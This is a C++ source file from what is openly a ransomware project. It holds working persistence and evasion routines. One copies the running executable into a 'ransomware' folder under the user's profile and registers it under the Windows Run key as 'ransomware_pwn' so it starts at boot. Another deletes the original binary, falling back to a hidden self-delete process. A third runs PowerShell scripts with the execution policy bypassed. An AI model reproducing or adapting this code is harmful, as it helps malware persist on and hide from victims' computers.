#include "misc.h"

void CustomDeleteFile(const char* file)
{
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_DELETE, file);
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

DWORD WINAPI sendThread(PVOID pv)
{
	while (1) 
	{
		Sleep(1000 * 60 * 1); //one minute
		std::cout << "Still copying." << std::endl;
	}
}

string Misc::current_working_directory()
{
	char working_directory[MAX_PATH + 1];
	GetCurrentDirectoryA(sizeof(working_directory), working_directory);
	return working_directory;
}

void Misc::call_ps(string filename)
{
	string ps_cmd = "powershell -executionPolicy bypass -file ";
	ps_cmd += current_working_directory() + "../../../powershell/" + filename;
	system(ps_cmd.c_str());
}

void Misc::CopyMyself() 
{
	char filename[MAX_PATH]; // declaring the executable as its own file

	char *szOSUserName = nullptr;
	size_t sz = 0;
	_dupenv_s(&szOSUserName, &sz, "USERNAME"); // get target user's name

	string path = "C:\\Users\\";
	string new_folder = "\\ransomware\\";
	string new_path;

	if (szOSUserName != NULL) {
		new_path = path; // This replaces the char version of snprintf()
		new_path += szOSUserName; // \Users\<name>
		new_path += new_folder; // \Users\<name\ransomware
		CreateDirectory(new_path.c_str(), NULL); // c_str() converts std::string to LPCSTR
	}
	else {
		new_path = path; // \Users
		new_path += new_folder; // \Users\ransomware
		CreateDirectory(new_path.c_str(), NULL);
	}

	BOOL stats = 0;
	DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); // get of running exe

	if (size)
	{
		new_path += "ransomware_copy.exe"; // \Users\<name\ransomware\ransomware_copy.exe
		CopyFile(filename, new_path.c_str(), stats); // ransomware.exe to be placed ^

		// add new binary to the registry keys for autostart at boot
		HKEY rkey;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &rkey);
		// give key a value name
		RegSetValueEx(rkey, "ransomware_pwn", 0, REG_SZ, (LPBYTE)new_path.c_str(), strlen(new_path.c_str())+1);

		// confirm reg key is thre
		call_ps("invoke_reg.ps1");

		// start a thread
		CreateThread(0, 0, sendThread, 0, 0, 0);

		// delete original file
		string file_to_delete = current_working_directory() + "\\" + filename;
		
		if (DeleteFileA(file_to_delete.c_str()) != 0)
		{
			std::cout << "[+] Original file deleted." << std::endl;
		}
		else {
			// start the self deleting process if DeleteFile doesn't work
			CustomDeleteFile(filename);
		}
	}
	else {
		std::cout << "[-] Could not add keys to registry.." << std::endl;
	}
}